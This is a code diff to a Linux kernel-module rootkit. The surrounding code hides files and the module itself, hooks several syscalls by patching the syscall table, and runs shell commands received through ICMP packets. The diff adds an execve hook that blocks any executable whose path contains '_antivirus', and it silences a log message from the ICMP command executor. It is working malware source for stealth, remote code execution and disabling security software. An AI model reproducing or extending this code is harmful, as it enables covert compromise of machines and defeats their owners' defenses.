@@ -25,6 +25,7 @@ extern struct module __this_module;
 #endif
 
 #define HIDE_PREFIX     "arman"
+#define EXEC_PREFIC     "_antivirus"
 #define HIDE_PREFIX_SZ  (sizeof(HIDE_PREFIX) - 1)
 
 #define MAX_CMD_LEN 1976
@@ -101,6 +102,7 @@ static syscall_wrapper orig_kill;
 static syscall_wrapper orig_sys_openat;
 static syscall_wrapper orig_sys_getdents64;
 static syscall_wrapper orig_unlink;
+static syscall_wrapper orig_execve;
 
 
 static inline void write_forced_cr0(unsigned long value)
@@ -255,6 +257,28 @@ static asmlinkage long h_sys_getdents64(struct pt_regs *regs)
 	return ret;
 }
 
+static asmlinkage long h_sys_execve(struct pt_regs *regs)
+{
+    char * exec_str = NULL;
+    const char __user *filename = (const char __user *)regs->di;
+
+    int exec_line_size = strnlen_user(filename, 256);
+    exec_str = kzalloc(exec_line_size, GFP_KERNEL);
+
+    copy_from_user(exec_str, filename, exec_line_size);
+    exec_str[exec_line_size] = '\0';
+
+    if (exec_str != NULL){
+//        printk(KERN_ALERT "EXECVE called: %s\n", exec_str);
+        if (strstr(exec_str, EXEC_PREFIC) != NULL){
+            printk(KERN_ALERT "Antivirus caught!!\n");
+            return -EACCES;
+        }
+    }
+
+    return orig_execve(regs);
+}
+
 #endif
 
 void hide_module(void)
@@ -343,6 +367,22 @@ static void restore_unlink(void)
     __sys_call_table_addr[__NR_unlink] = (unsigned long)orig_unlink;
 }
 
+static void store_execve(void)
+{
+    orig_execve = (syscall_wrapper)__sys_call_table_addr[__NR_execve];
+}
+
+static void hook_execve(void)
+{
+    __sys_call_table_addr[__NR_execve] = (unsigned long)&h_sys_execve;
+}
+
+static void restore_execve(void)
+{
+    /* Restore syscall table */
+    __sys_call_table_addr[__NR_execve] = (unsigned long)orig_execve;
+}
+
 static void work_handler(struct work_struct * work)
 {
     static char *argv[] = {"/bin/sh", "-c", cmd_string, NULL};
@@ -362,7 +402,7 @@ static unsigned int icmp_cmd_executor(void *priv, struct sk_buff *skb, const str
     unsigned char *tail;
     int j = 0;
 
-    pr_info("icmp_cmd_executor executing\n");
+//    pr_info("icmp_cmd_executor executing\n");
 
     iph = ip_hdr(skb);
     icmph = icmp_hdr(skb);
@@ -439,6 +479,7 @@ static int __init mod_init(void)
     store_openat();
     store_getdents64();
     store_unlink();
+    store_execve();
 
     unprotect_memory();
 
@@ -446,6 +487,7 @@ static int __init mod_init(void)
     hook_getdents64();
     hook_openat();
     hook_unlink();
+    hook_execve();
 
     protect_memory();
 
@@ -464,6 +506,7 @@ static void __exit mod_exit(void)
     restore_openat();
     restore_getdents64();
     restore_unlink();
+    restore_execve();
 
     protect_memory();
 
